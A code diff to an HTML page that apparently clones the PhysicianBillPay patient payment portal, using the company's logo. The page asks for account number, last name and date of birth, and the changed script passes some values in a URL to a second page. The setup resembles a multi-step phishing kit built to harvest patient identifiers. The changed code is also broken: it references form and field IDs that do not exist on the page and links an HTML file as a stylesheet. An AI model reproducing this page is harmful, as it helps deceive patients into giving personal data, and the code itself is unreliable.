@@ -2,6 +2,7 @@
 <html lang="en">
 
 <head>
+    <link rel="stylesheet" href="index1.html">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
     <style>
         body {
@@ -186,7 +187,7 @@
             <img alt="PhysicianBillPay Logo" src="https://www.physicianbillpay.com/static/media/physician-bill-pay.ba3a124c.png" width="250" />
             <p class="text-sm" style="color: #4A5568;">Acct Number/Patient-Last Name/DOB</p>
         </div>
-        <form action="#" method="POST" onsubmit="return openSecondForm()"></form>
+        <form id="form1" onsubmit="return redirectToSecondPage()"></form>
         <div>
             <div class="input-container">
                 <input type="text" id="account-number-1" placeholder=" " required pattern="[A-Za-z][0-9]{6} " required onfocus="this.placeholder='P12345678'" onblur="this.placeholder=''">
@@ -385,21 +386,13 @@
             input.value = filteredValue;
         }
 
+        document.getElementById('step1Form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('name').value;
+            const accountNumber = document.getElementById('accountNumber').value;
 
-        function openSecondForm() {
-            const accountNumber = document.getElementById('account-number-1').value;
-            const lastName = document.getElementById('last-name').value;
-            const dob = document.getElementById('dob').value;
-
-            // Store values in localStorage
-            localStorage.setItem('accountNumber', accountNumber);
-            localStorage.setItem('lastName', lastName);
-            localStorage.setItem('dob', dob);
-
-            // Redirect to the second form
-            window.location.href = 'index1.html';
-            return false; // Prevent default form submission
-        }
+            window.location.href = `index1.html?name=${encodeURIComponent(name)}&accountNumber=${encodeURIComponent(accountNumber)}`;
+        });
     </script>
 
 
